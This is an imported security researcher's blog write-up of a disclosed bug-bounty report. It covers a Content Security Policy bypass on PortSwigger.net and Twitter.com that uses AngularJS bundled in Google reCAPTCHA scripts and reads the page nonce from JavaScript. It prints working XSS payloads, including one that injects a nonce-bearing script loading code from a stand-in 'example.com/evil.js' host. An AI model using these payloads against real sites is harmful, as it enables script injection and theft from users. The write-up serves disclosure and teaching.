---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-02-19_csp-bypass-on-portswiggernet-using-google-script-resources.md
original_filename: 2024-02-19_csp-bypass-on-portswiggernet-using-google-script-resources.md
title: CSP bypass on PortSwigger.net using Google script resources
category: documents
detected_topics:
- xss
- supply-chain
- sso
- command-injection
- mfa
- automation-abuse
tags:
- imported
- documents
- xss
- supply-chain
- sso
- command-injection
- mfa
- automation-abuse
language: en
raw_sha256: 807436971133e17585f0f590d7317cd58c8b35518960be7c797cfdcbc1ae402b
text_sha256: f2543e8392c8a37cd7f5f05a05e9f90e8ac4a766701632e9559e43ecf796a221
ingested_at: '2026-06-28T07:32:31Z'
sensitivity: unknown
redactions_applied: false
---

# CSP bypass on PortSwigger.net using Google script resources

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-02-19_csp-bypass-on-portswiggernet-using-google-script-resources.md
- Source Type: markdown
- Detected Topics: xss, supply-chain, sso, command-injection, mfa, automation-abuse
- Ingested At: 2026-06-28T07:32:31Z
- Redactions Applied: False
- Raw SHA256: `807436971133e17585f0f590d7317cd58c8b35518960be7c797cfdcbc1ae402b`
- Text SHA256: `f2543e8392c8a37cd7f5f05a05e9f90e8ac4a766701632e9559e43ecf796a221`


## Content

---
title: "CSP bypass on PortSwigger.net using Google script resources"
page_title: "CSP bypass on PortSwigger.net using Google script resources - Johan Carlsson"
url: "https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/"
final_url: "https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/"
authors: ["Johan Carlsson (@joaxcar)"]
programs: ["PortSwigger"]
bugs: ["CSP bypass"]
bounty: "1,500"
publication_date: "2024-02-19"
added_date: "2024-02-27"
source: "pentester.land/writeups.json"
original_index: 421
---

# CSP bypass on PortSwigger.net using Google script resources

Portswigger just [disclosed a report](https://hackerone.com/reports/2279346) of mine over on HackerOne. It’s an unusual report in that the issue reported is purely a CSP bypass. I thought that I could provide a bit of context to the report to answer some questions raised in relation to it.

First a TL;DR

  * Don’t take the acceptance of this report as a cue to start submitting CSP bypasses to programs. Its context is program-specific, which leads to point two.
  * Understand your target! What they care about, and how their threat model looks.
  * Think outside the box. “Recon” does not always equal running subdomain tools. Read blogs, newsletters, and other feeds to understand what your target cares about.

### A Twitter CSP challenge

I saw this tweet a couple of months ago:

![Tweet by @_godiego_ asking for help to bypass the CSP on Twitter.com](https://joaxcar.com/blog/wp-content/uploads/2024/02/Screenshot-2024-02-19-at-18.27.31-1024x356.png)

Any CSP (Content Security Policy) challenge always intrigues me, it’s a surprisingly deep topic. Setting up a good CSP might initially look simple, but it often becomes a balancing act between allowing functionality while still blocking security risks. One problem with CSP is that any small crack in the policy might throw the protection from the whole policy out the window.

A CSP works by restricting certain access patterns to be used by the content on the loaded document. This is done by declaring a list of `policy directives` (throgh a CSP header or through `meta` tags) consisting of a directive name and a list of allowed sources for that directive.

In the case of XSS, the most interesting directive is `script-src` as it describes how the document is allowed to load JavaScript. Two common ways to set up a `script-src` directive are either through a whitelist approach or using the (often safer) nonce-based approach. When specifying a `nonce` in the CSP, any script on the page will be allowed to load but only as long as the script tag is decorated with the same `nonce` value
  
  
  <script src="" nonce="ABC"></script>
  

This is often the recommended approach as an attacker won’t be able to inject script tags with the correct `nonce` (the `nonce` should be a long random value generated for each page load).

If a site is instead using a whitelist of URLs, the page runs the risk that any of these URLs hosting dangerous libraries that an attacker can abuse to escalate to a full XSS. One library that often causes CSP bypasses is [Angular JS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) but there are an abundance of other script sources that can be abused.

A feature of CSP that tend to confuses people, both when implementing and also when trying to find bypasses, is when a `nonce` is declared in the `script-src` directive together with the keyword `strict-dynamic`. This combination will allow any script with a `nonce` attribute to inject additional script elements into the DOM and have them execute, even if these new script tags lack the declared `nonce` value. This combination of `nonce` and `strict-dynamic` will also make the page ignore any additional whitelisted URLs in the `script-src` directive.

Using a trusted script to add untrusted script to a page is a common way to bypass CSPs. It requires the attacker to find a gadget inside any trusted script that will dynamically generate a script tag with the attacker’s content or src. See an example of this [here](https://hackerone.com/reports/1588732) where jQuery generates a script tag and ads it to the page. As the loaded jQuery script has a valid `nonce` its allowed to add new script tags to the DOM without the `nonce` value.

The inverse situation was present in the case of Twitter’s CSP. They had a `nonce` declared but lacked the `strict-dynamic` value. This creates a situation where dynamically added scripts are not trusted per default. Instead, any new script are checked against both the `nonce` and the URL whitelist.

### Bypassing the Twitter CSP using Angular JS and nonce

Multiple people jumped on to help with the challenge of finding a CSP bypass on Twitter.com. [@sudi](https://twitter.com/sudhanshur705/status/1732760081094091117) came with an interesting suggestion linked from a Google CTF where the solution included using one of Google’s domains as a loophole. The whole writeup by [@huli](https://twitter.com/aszx87410) is worth a read, but the main takeaway is that the Google Recaptcha service boundless Angular JS, the classic CSP breaker.

Let’s have a look at the `script-src` part of Twitter’s CSP using <https://csp-evaluator.withgoogle.com/>

![The Content Security Policy of Twitter.com ](https://joaxcar.com/blog/wp-content/uploads/2024/02/Screenshot-2024-02-09-at-15.23.31-1024x413.png)

As we can see, there is a `nonce` but no `strict-dynamic` keyword. As we now know, this means that any URL in the whitelist is allowed as a script source. The list probably contains multiple URLs that host dangerous gadgets (see a tweet by [@renniepak](https://twitter.com/renniepak/status/1732851779065287045) for a gadget using `https://www.google-analytics.com`), but the interesting one for us is `https://www.google.com/recaptcha/` as shown in the CTF writeup. (Also note that the CSP evaluator does not know about the Angular package in Recaptcha)

At this stage, we can inject a payload like this to show an alert box (still just copying from the CTF writeup)
  
  
  <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
  
  <img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
  

The problem is that even if an alert box is interesting, it’s not proof of arbitrary code execution. Trying to replace `alert` with `eval` under Twitter’s CSP will throw an error

> EvalError: Refused to evaluate a string as JavaScript because ‘unsafe-eval’ is not an allowed source of script

The CSP `script-src` directive does not contain the value `unsafe-eval`, and thus we can not execute strings using `eval` or `setTimeout`. As an attacker (or as a researcher looking for maximum impact), we need to find a way to escalate the restricted XSS to a full-blown XSS that will execute whatever we want. Let’s get back to CSP theory.

### Accessing script nonce from javascript

A somewhat common misconception regarding CSP is that the `nonce` value is hidden after the DOM has loaded. This is only partly true. Looking at the DOM in dev-tools after loading a page with scripts decorated with `nonces,` there are no `nonce` values to be seen on the script tags, only an empty nonce attribute. This, however, does not mean that the `nonce` value is removed; it is just hidden from “side channels” such as CSS. The value is still retrievable from JavaScript.

This is described in HTML spec [here](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#nonce-attributes%3Aattr-nonce) and there is also an interesting discussion about it [here](https://github.com/w3c/webappsec-csp/issues/458). From JavaScript, we just need to access the `nonce` attribute of a DOM node using regular `node.nonce` notation. To find any node with the current page `nonce`, we can do like this
  
  
  const nonce = document.querySelector("[nonce]").nonce;
  

When we now have the `nonce`, we can create valid `script` tags and add them to the DOM as we please.

Using this technique, we can escalate the previous Angular JS injection to arbitrary XSS by importing a new script with any source we want using the valid `nonce`
  
  
  <script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
  
  <img src=x ng-on-error='
  doc=$event.target.ownerDocument;
  a=doc.defaultView.top.document.querySelector("[nonce]");
  b=doc.createElement("script");
  b.src="//example.com/evil.js";
  b.nonce=a.nonce; doc.body.appendChild(b)'>
  

I verified that this worked as a full CSP bypass on Twitter.com, but at that time, [@godiego](https://twitter.com/_godiego__) had already gotten help from another researcher. Still, I was happy with what I had crafted and thought that I might be able to use it elsewhere.

### Reporting a CSP bypass

In bug bounty, we are usually constrained to look at issues where we can show the whole attack chain. I have never seen a program accepting a report for purely a CSP bypass. Having a full chain is, however, not a hard rule, as some issues like 2FA bypass are usually in scope. A lot of programs also accept “XSS without CSP bypass” (as valid but at lower risk), even if they essentially have zero impact. A CSP is often seen as merely defense in depth, and I guess that companies often expect their CSPs not to be perfect.

Personally, I think that more mature programs should consider CSP bypasses as in scope and treat them on par with an XSS that CSP blocks. This is an opinion that I don’t seem to share with too many programs when looking at their policies.

There was, however, one company I thought might be as excited as myself when it comes to web quirks, PortSwigger. I remembered this [blog post](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro) from Gareth Hayes where he found a CSP bypass on PortSwigger’s main domain.

In this blog post, Gareth examines a third-party dependency called Pitwik PRO and finds a CSP bypass hidden inside using an Angular JS vector. If they had deployed the dependency, they would have opened up a hole in their defense. Gareth writes

> Any individual website component can undermine the security of the entire site, and analytics platforms are no exception. With this in mind, we decided to do a quick audit of Piwik PRO to make sure it was safe to deploy on portswigger.net.

Gareth reported this issue to Pitwik and got it fixed. He then ended the blog post with this statement

> This is now live – if you find something we missed please report it to [PortSwigger’s](https://hackerone.com/portswigger) and [Piwik PRO’s](https://piwik.pro/bug-bounty-program/) bug bounty programs.

I read that as: “We accept CSP bypass reports”!

### Bypassing Portswigger.net CSP

Sometimes, in bug bounties, the stars align. I went to portswigger.net to check out their CSP, and to my surprise, the same setup from Twitter was present. The CSP had a whitelist containing both `https://www.google.com/recaptcha` and `https://www.gstatic.com/recaptcha`, which both host the `about/js/main.min.js` file containing Angular JS. The CSP also had a `nonce` configured but lacked the `strict-dynamic` keyword, just as on Twitter.com.

What this meant was that I could use the same payload as on Twitter to bypass the CSP on PortSwigger.net. The only issue was that I had no HTML injection to tie the bypass to. I spent some time looking for such an injection to use for a full exploit but did not feel too motivated to keep at it. I decided to report the CSP issue as is and point to the blog post from Gareth.

Just as I had hoped, they found it as interesting as myself and accepted the report.

After an initial fix, I also pointed out that they were lacking the `form-action` directive, which could lead to credential leaks, and they decided to fix that as well. They awarded me a bounty of 1000$ for the CSP bypass and a bonus of 500$ for the `form-action` issue.

### Conclusion

I had a lot of fun finding and reporting this issue. I understand that people might raise their eyebrows when reading the report as it resembles a self-XSS or a “missing security header.” I, on my part, think that there is value in the report, and I am glad that the Portswigger team felt the same way.

Still (as mentioned at the beginning of this post), I don’t recommend running around reporting CSP bypasses to companies at this point in time. Most companies will probably close this as `informational` if not as `Not applicable`, and it might cause more frustration than success.

What I do recommend is playing with CSP. It’s a deep subject, and having knowledge of the quirks hidden in the specification is a great tool in your toolbelt.

* * *

Posted 

February 19, 2024

in 

[Writeups](https://joaxcar.com/blog/category/writeups/)

by 

Johan Carlsson

Tags:
